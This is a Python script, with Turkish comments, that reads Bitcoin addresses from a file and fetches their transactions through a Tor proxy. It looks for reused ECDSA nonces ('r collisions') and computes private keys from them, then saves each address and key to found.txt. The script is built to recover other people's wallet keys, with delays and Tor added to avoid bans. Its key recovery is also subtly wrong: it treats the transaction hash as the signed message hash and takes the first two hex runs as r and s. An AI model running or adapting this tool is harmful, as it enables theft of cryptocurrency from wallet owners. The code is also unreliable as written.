import requests
import time
import random
import re
from hashlib import sha256
from binascii import unhexlify

def fetch_transactions(address, proxies):
    """Fetch transactions for a given BTC address."""
    url = f"https://blockchain.info/rawaddr/{address}"
    try:
        response = requests.get(url, proxies=proxies, timeout=10)
        response.raise_for_status()
        data = response.json()
        return data.get("txs", [])
    except requests.exceptions.RequestException as e:
        print(f"Error fetching transactions for {address}: {e}")
        return None

def extract_r_s(script_sig):
    """Extract r and s values from a scriptSig."""
    matches = re.findall(r'[0-9a-fA-F]{64}', script_sig)
    if len(matches) >= 2:
        return matches[0], matches[1]  # r ve s değerleri
    return None, None

def calculate_private_key(r1, s1, z1, s2, z2):
    """Calculate private key from r, s1, z1, s2, z2."""
    try:
        s_diff = (int(s1, 16) - int(s2, 16)) % 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
        z_diff = (int(z1, 16) - int(z2, 16)) % 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
        s_diff_inv = pow(s_diff, -1, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141)
        private_key = (z_diff * s_diff_inv) % 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
        return hex(private_key)[2:].zfill(64)
    except Exception as e:
        print(f"Error calculating private key: {e}")
        return None

def process_transactions(transactions, found_file, address):
    """Process transactions to find r collisions and recover private keys."""
    if not transactions:
        print("No transactions to process.")
        return

    seen_r = {}

    for tx in transactions:
        for input_tx in tx.get("inputs", []):
            script_sig = input_tx.get("script", "")
            print(f"Processing script: {script_sig}")

            r, s = extract_r_s(script_sig)
            if r:
                print(f"Found r: {r}, s: {s}")

                if r in seen_r:
                    print("r collision detected! Attempting to calculate private key...")
                    z1, s1 = seen_r[r]
                    private_key = calculate_private_key(r, s1, z1, s, tx.get("hash", "0"))

                    if private_key:
                        print(f"Recovered private key for address {address}: {private_key}")
                        with open(found_file, "a") as f:
                            f.write(f"Address: {address}, Private key: {private_key}\n")
                    else:
                        print("Failed to recover private key.")
                else:
                    seen_r[r] = (tx.get("hash", "0"), s)

def main():
    # SOCKS5 Proxy ayarları
    proxies = {
        "http": "socks5h://127.0.0.1:9050",
        "https": "socks5h://127.0.0.1:9050",
    }

    # Rastgele sıralı adres listesi
    address_file = "g.txt"
    found_file = "found.txt"

    with open(address_file, "r") as f:
        addresses = [line.strip() for line in f.readlines()]

    random.shuffle(addresses)  # Adresleri rastgele sıraya koy

    for address in addresses:
        print(f"Processing address: {address}")
        transactions = fetch_transactions(address, proxies)

        if transactions is None:
            print("Skipping due to fetch error.")
            time.sleep(7)  # Ban yememek için bekleme süresi
            continue

        process_transactions(transactions, found_file, address)
        time.sleep(7)  # Her adres arasında bekleme süresi

if __name__ == "__main__":
    main()
